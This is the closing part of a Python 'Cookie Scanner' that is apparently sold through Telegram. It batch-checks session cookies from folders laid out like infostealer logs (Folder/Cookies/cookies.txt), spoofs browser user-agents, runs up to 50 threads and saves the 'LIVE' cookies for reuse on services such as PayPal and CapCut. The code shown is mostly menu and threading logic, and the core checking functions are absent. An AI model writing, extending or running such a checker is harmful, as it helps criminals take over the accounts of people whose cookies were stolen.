            print_batch_results(batch_results)


            if args.result:
                save_batch_results_to_file(batch_results, args.result, path)
        else:
            print(f"{Colors.RED}[ERROR]{Colors.RESET} Batch scan failed or no results")

    else:
        print(f"{Colors.RED}[ERROR]{Colors.RESET} Invalid path: {path}")

def run_with_spinner(func, *args, **kwargs):
    result_container = {"result": None, "error": None}
    done = threading.Event()

    def target():
        try:
            result_container["result"] = func(*args, **kwargs)
        except Exception as e:
            result_container["error"] = e
        finally:
            done.set()

    t = threading.Thread(target=target, daemon=True)
    t.start()

    spinner_cycle = itertools.cycle(["|", "/", "-", "\\"])
    last_update = 0.0

    while not done.is_set():
        now = time.time()
        if now - last_update >= 0.1:
            last_update = now
            sys.stdout.write(f"\r{Colors.CYAN}[RUN]{Colors.RESET} Working... {next(spinner_cycle)}")
            sys.stdout.flush()
        time.sleep(0.05)

    sys.stdout.write("\r" + " " * 80 + "\r")
    sys.stdout.flush()

    if result_container["error"] is not None:
        raise result_container["error"]

    return result_container["result"]

def run_interactive_mode():
    global CUSTOM_USER_AGENT
    
    curl_cffi_status = f" (curl_cffi {Colors.GREEN}[OK]{Colors.RESET})" if HAS_CURL_CFFI else f" (curl_cffi {Colors.RED}[MISSING]{Colors.RESET})"

    print("Cookie Scanner" + curl_cffi_status)
    print(f"{Colors.CYAN}Author: m3lOd1x{Colors.RESET}")
    print(f"{Colors.BLUE}Seller, Support: TSP1K33{Colors.RESET}")
    print(f"{Colors.GREEN}If there’s an error, please message me on Telegram so I can fix it quickly.{Colors.RESET}")
    print(f"{Colors.GREEN}If you disclose the tool, you will forfeit access to any further updates{Colors.RESET}")
    print("New Update: CapCut, PayPal, Fix errors")
    print("=" * 60)
    print()
    print("Options:")
    print("1. Scan cookies from .txt file")
    print("2. Scan cookies from content string")
    print("3. Batch scan multiple folders (Folder/Cookies/file.txt)")
    print("4. Fast folder scan (one or multi services)")
    print("5. Set custom User-Agent")
    print("6. Exit")
    print()
    print(f"{Colors.BLUE}[USER-AGENT]{Colors.RESET} Current: {CUSTOM_USER_AGENT[:80]}{'...' if len(CUSTOM_USER_AGENT) > 80 else ''}")
    print()

    while True:
        try:
            choice = input(f"{Colors.CYAN}[CHOOSE]{Colors.RESET} Choose an option (1-6): ").strip()

            if choice == '1':

                prompt_user_agent()

                file_path = input(f"{Colors.BLUE}[FILE]{Colors.RESET} Enter path to .txt file: ").strip().strip('"').strip("'")
                if not file_path:
                    print(f"{Colors.RED}[ERROR]{Colors.RESET} No file path provided")
                    continue

                print(f"\n{Colors.CYAN}[SCAN]{Colors.RESET} Scanning cookies from: {file_path}")
                print(f"{Colors.YELLOW}[WAIT]{Colors.RESET} Please wait...")

                results = run_with_spinner(scan_cookies_from_file, file_path)
                if results:
                    print_scan_results(results, file_path)
                else:
                    print(f"{Colors.RED}[ERROR]{Colors.RESET} Failed to scan cookies")

            elif choice == '2':

                prompt_user_agent()

                print(f"{Colors.CYAN}[INPUT]{Colors.RESET} Paste your cookies content (press Enter twice when done):")
                lines = []
                while True:
                    line = input()
                    if line == "" and len(lines) > 0 and lines[-1] == "":
                        break
                    lines.append(line)

                content = '\n'.join(lines[:-1])

                if not content.strip():
                    print(f"{Colors.RED}[ERROR]{Colors.RESET} No content provided")
                    continue

                print(f"{Colors.YELLOW}[WAIT]{Colors.RESET} Please wait...")
                results = run_with_spinner(scan_cookies_from_content, content)
                if results:
                    print_scan_results(results, "Pasted Content")
                else:
                    print(f"{Colors.RED}[ERROR]{Colors.RESET} Failed to scan cookies")


            elif choice == '3':

                prompt_user_agent()

                print(f"{Colors.CYAN}[BATCH SCAN]{Colors.RESET}")
                print("Structure: MainFolder/Folder1/Cookies/cookies.txt")
                print("=" * 50)

                folder_path = input(f"{Colors.BLUE}[FOLDER]{Colors.RESET} Enter the main folder path: ").strip().strip('"').strip("'")
                if not folder_path:
                    print(f"{Colors.RED}[ERROR]{Colors.RESET} Please enter the folder path!")
                    continue


                while True:
                    try:
                        thread_input = input(f"{Colors.YELLOW}[THREADS]{Colors.RESET} Number threads (1-50, default 10): ").strip()
                        if not thread_input:
                            max_workers = 10
                            break
                        max_workers = int(thread_input)
                        if 1 <= max_workers <= 50:
                            break
                        else:
                            print(f"{Colors.RED}[ERROR]{Colors.RESET} Thread count must be between 1 and 50")
                    except ValueError:
                        print(f"{Colors.RED}[ERROR]{Colors.RESET} Please enter a valid number")


                while True:
                    save_choice = input(f"{Colors.CYAN}[SAVE]{Colors.RESET} Save LIVE cookies to separate file? (y/n, default y): ").strip().lower()
                    if save_choice in ['', 'y', 'yes', 'có', 'c']:
                        save_live = True
                        output_folder = input(f"{Colors.BLUE}[FOLDER]{Colors.RESET} name folder output (default 'LIVE_Cookies'): ").strip()
                        if not output_folder:
                            output_folder = "LIVE_Cookies"
                        break
                    elif save_choice in ['n', 'no', 'không', 'k']:
                        save_live = False
                        output_folder = None
                        break
                    else:
                        print(f"{Colors.RED}[ERROR]{Colors.RESET} Please enter y or n")


                print(f"\n{Colors.CYAN}[SCAN]{Colors.RESET} Scanning folder: {folder_path}")
                print(f"{Colors.YELLOW}[THREADS]{Colors.RESET} Using {max_workers} threads")
                print(f"{Colors.YELLOW}[WAIT]{Colors.RESET} Please wait...")

                batch_results = run_with_spinner(scan_batch_folders, folder_path, max_workers=max_workers)

                if batch_results and 'error' not in batch_results:
                    print_batch_results(batch_results)


                    if save_live and batch_results.get('total_live', 0) > 0:
                        print(f"\n{Colors.CYAN}[SAVE]{Colors.RESET} Saving LIVE cookies to {output_folder}...")
                        save_live_cookies(batch_results, output_folder)
                        print(f"{Colors.GREEN}[COMPLETE]{Colors.RESET} Save completed!")
                else:
                    print(f"{Colors.RED}[ERROR]{Colors.RESET} Batch scan failed or no results")
                
            elif choice == '4':
                run_with_spinner(fast_folder_scan)
                
            elif choice == '5':
                print(f"\n{Colors.BLUE}[USER-AGENT]{Colors.RESET} SET CUSTOM USER-AGENT")
                print("=" * 50)
                print("Current User-Agent:")
                print(f"  {CUSTOM_USER_AGENT}")
                print()
                print("Popular User-Agent options:")
                print("1. Chrome (Windows): Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
                print("2. Firefox (Windows): Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:143.0) Gecko/20100101 Firefox/143.0")
                print("3. Edge (Windows): Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36 Edg/140.0.0.0")
                print("4. Safari (macOS): Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Version/17.0 Safari/537.36")
                print("5. Mobile Chrome: Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36")
                print()

                ua_choice = input("Enter option number (1-5) or paste custom User-Agent: ").strip()

                if ua_choice == '1':
                    CUSTOM_USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
                elif ua_choice == '2':
                    CUSTOM_USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:143.0) Gecko/20100101 Firefox/143.0'
                elif ua_choice == '3':
                    CUSTOM_USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36 Edg/140.0.0.0'
                elif ua_choice == '4':
                    CUSTOM_USER_AGENT = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Version/17.0 Safari/537.36'
                elif ua_choice == '5':
                    CUSTOM_USER_AGENT = 'Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
                else:

                    if ua_choice and len(ua_choice) > 10:
                        CUSTOM_USER_AGENT = ua_choice
                        print(f"{Colors.GREEN}[SUCCESS]{Colors.RESET} Custom User-Agent set successfully!")
                    else:
                        print(f"{Colors.RED}[ERROR]{Colors.RESET} Invalid User-Agent. Please provide a valid User-Agent string.")
                        continue

                print(f"{Colors.GREEN}[SUCCESS]{Colors.RESET} User-Agent updated: {CUSTOM_USER_AGENT[:80]}{'...' if len(CUSTOM_USER_AGENT) > 80 else ''}")

            elif choice == '6':
                print(f"\n{Colors.CYAN}[BYE]{Colors.RESET} Goodbye!")
                break

            else:
                print(f"{Colors.RED}[ERROR]{Colors.RESET} Invalid choice. Please enter 1, 2, 3, 4, 5, or 6")
                continue

        except KeyboardInterrupt:
            print(f"\n{Colors.CYAN}[BYE]{Colors.RESET} Program interrupted. Goodbye!")
            break
        except Exception as e:
            print(f"{Colors.RED}[ERROR]{Colors.RESET} An error occurred: {str(e)}")

        continue_choice = input(f"\n{Colors.YELLOW}[CONTINUE]{Colors.RESET} Do you want to scan more cookies? (y/n): ").strip().lower()
        if continue_choice not in ['y', 'yes', 'có', 'c']:
            print(f"\n{Colors.CYAN}[BYE]{Colors.RESET} Goodbye!")
            break

if __name__ == "__main__":                                                                                                                                                                                                                                                                                                                                                                                                                                                                          #make by @m3l0d1x 
    try:
        import sys
        if sys.platform == "win32":
            import codecs
            sys.stdout = codecs.getwriter("utf-8")(sys.stdout.detach())
            sys.stderr = codecs.getwriter("utf-8")(sys.stderr.detach())
        
        main()
    except KeyboardInterrupt:
        print("\n\n👋 Program interrupted. Goodbye!")
    except Exception as e:
        print(f"\n{Colors.RED}[ERROR]{Colors.RESET} An error occurred: {str(e)}")
        print("Please check your input and try again.")